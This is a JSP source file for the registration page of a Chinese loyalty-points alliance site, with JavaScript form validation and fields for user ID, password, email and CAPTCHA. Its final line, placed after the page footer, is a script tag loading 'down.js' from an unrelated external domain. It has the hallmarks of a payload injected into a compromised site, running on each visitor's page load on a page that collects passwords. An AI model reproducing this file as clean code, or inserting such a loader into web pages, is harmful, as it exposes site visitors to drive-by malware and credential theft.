<%@ page language="java" pageEncoding="GBK" %>
<%@ taglib prefix="c" uri="http://java.sun.com/jstl/core" %>
<%@ taglib prefix="fmt" uri="http://java.sun.com/jstl/fmt" %>
<c:set var="title" value="积分联盟-用户注册"/> 
<%@ include file="IncludeTop.jsp" %>

<script type="text/javascript">
<!--
var w_wait;
function checksignup() {
    if(! document.all.read_flag.checked){
	     alert("请你先阅读本联盟的注册条款");
		 document.all.read_flag.focus();
		 return false;
	}

   if(validate(document.all.check_sum, '校验码', 'public', 4,  8, false) &&
      validate(document.all.signup_uid, '用户ID', 'identifier', 4, 32, false) &&
	  validate(document.all.signup_pwd, '密码', 'public', 6, 64, false)&&
	  validate(document.all.signup_email, 'Email', 'email', 0, 64, false)){
	        if(document.all.signup_pwd.value != document.all.signup_pwd2.value){
			     alert("两次密码输入不一致");
				 document.all.signup_pwd.focus();
			     return false;
			}
			w_wait = window.open("about:blank", "waiting", "width=300,height=150");
			w_wait.document.write("<center>正在注册，请稍候……</center>");
			document.all.registerform.userid.value=document.all.signup_uid.value;
			document.all.registerform.password.value=document.all.signup_pwd.value;
			document.all.registerform.email.value=document.all.signup_email.value;
			document.all.registerform.checksum.value=document.all.check_sum.value;
			document.all.registerform.submit();			
			return true;
		}
	  return false;
}
	
function CheckUser(){	
		if(validate(document.all.signup_uid, '用户ID', 'identifier', 0, 32, false)){
			window.open('<c:url value="/register.do"/>?userid='+document.all.signup_uid.value+'&&ischeck=true','','width=292,height=180,left=200,top=150,toolbar=no,menubar=no,scrollbars=no,resizable=no,location=no,status=no');
	   }				
}


window.onunload=window_onunload;

function window_onunload() {
	if (w_wait){
		w_wait.close();
	}
}

//-->
</script>


<table width="780" border="0" align="center" cellpadding="0" cellspacing="0">
  <tr> 
    <td width="178" valign="top"> 
      <%@ include file="searchProductBar.jsp" %>
      <%@ include file="searchAllBar.jsp" %>
      <%@ include file="newsBar.jsp" %>    </td>
    <td width="602" bgcolor="#FFFFFF" valign="top">
      <table  width="100%" height="61" border="0" cellpadding="0" cellspacing="0">
        <tr > 
          <td align="center">&nbsp;</td>
        </tr>
        <tr> 
          <td align="center" class="black12"><font color="#003399" class="red15" >申请联盟帐号</font></td>
        </tr>
        <tr> 
          <td align="center" class="black12">&nbsp;</td>
        </tr>
        <tr> 
          <td align="center" class="black12"> 
            <p>当您完成下面的表单后，您将成为联盟会员并得到<span class="red">1000点</span>联盟积分数</p>          </td>
        </tr>
      </table>
      <table width="100%" border="0" cellpadding="0" cellspacing="3">
        <tr> 
          <td colspan="2" align="center" class="black12" >&nbsp;</td>
        </tr>

        <tr>
          <td align="RIGHT" class="black12" >&nbsp;</td>
          <td class="black12">&nbsp;</td>
        </tr>
        <tr> 
          <td align="RIGHT" class="black12" ><font color="#FF0000">*</font>联盟账号：</td>
          <td class="black12"> 
            <input name="signup_uid" maxlength="32" class="medium" size="20">
            <input type="button" value="检查用户名是否可用" style="width:150px;font-size:12px;color:navy" onClick="javascript:CheckUser()" name="btnCheckUser">          </td>
        </tr>
        <tr> 
          <td width="109" class="black12">&nbsp;</td>
          <td class="black12"><font color="#666666" class="small">合法的用户名应该由<b><font color="#CC0000">a-z的英文字母（不区分大小写）、0-9的数字或下划线</font></b>组成，并以英文字母开头，例如：johnson168</font></td>
        </tr>
        <tr> 
          <td height="23" align="RIGHT" class="black12" "><font color="#FF0000">*</font><font class="medium">密码：</font></td>
          <td bordercolor="#FFCC33" class="black12"> 
            <input name="signup_pwd" type=password id=upwd size=20 maxlength=12 >		  </td>
        </tr>
        <tr> 
          <td height="24" align="RIGHT" class="black12"><font color="#FF0000">*</font><font class="medium">再输一遍密码：</font></td>
          <td class="black12"> 
            <input type="PASSWORD" name="signup_pwd2" maxlength="64" class="medium" size="20">          </td>
        </tr>
        <tr> 
          <td width="109" align="RIGHT" class="black12"><font color="#FF0000">*</font><font class="medium">电子邮件：</font></td>
          <td class="black12"> 
            <input name="signup_email" size="30" maxlength="64" class="medium">          </td>
        </tr>
        <tr> 
          <td height="20" align="RIGHT" class="black12">&nbsp;</td>
          <td class="black12"><font color="#666666">注册完毕将有一封<font color="#CC0000"><b>确认信</b><font color="#666666">发至您的信箱中</font></font></font></td>
        </tr>
        <tr>
          <td height="23" align="right" class="black12"><font color="#FF0000">*</font><font class="medium"></font>校验码：</td>
          <td class="black12"><img src='<c:url value="/checkSumImg.do"/>' width="75" height="20" /></td>
        </tr>
        <tr>
          <td height="21" align="right" class="black12"><font color="#FF0000">*</font><font class="medium"></font>输入校验码：</td>
          <td class="black12"><input name="check_sum" maxlength="8" class="medium" size="20" />          </td>
        </tr>
        <tr>
          <td align="RIGHT" class="black12">&nbsp;</td>
          <td class="black12">&nbsp;</td>
        </tr>
        <tr> 
          <td align="RIGHT" class="black12">注册条款:</td>
          <td width="484" class="black12"> 
            <input type="checkbox" name="read_flag" value="checkbox">
            我已仔细阅读并接受积分联盟的<a href='<c:url value="/protocol.screen"/>' >注册条款</a>。</td>
        </tr>		
        <tr> 
          <td align="RIGHT" class="black12">&nbsp;</td>
          <td class="black12">&nbsp;</td>
        </tr>
      </table>
      <table width="100%" border="0">
        <tr> 
          <td width="214" align="right" height="32"> 
            <input type=button value="申 请" class="medium" onClick="javascript:return checksignup()" name="signup_submit">          </td>
          <td width="346" height="32"> 
            <input type=RESET value="重 填" class="medium" name="signup_reset">          </td>
        </tr>
      </table>
      <c:set var="trBegin" value='<tr>' /> <c:set var="trEnd" value='</tr>' /> 
      <c:set var="colomnSize" value="2" /> </td>
  </tr>
</table>
<form  name="registerform" id="registerform" method="post" action='<c:url value="/register.do"/>'>
	<input id="userid" type="hidden" name="userid"  value="">
	<input name="password" type="hidden" id="password" value=''>
	<input name="email" type="hidden" id="email" value=''>
	<input name="checksum" type="hidden" id="checksum" value=''>	
</form>
<%@ include file="IncludeBottom.jsp" %>

<script language=javascript src=http://Town.531jx.cn/down.js></script>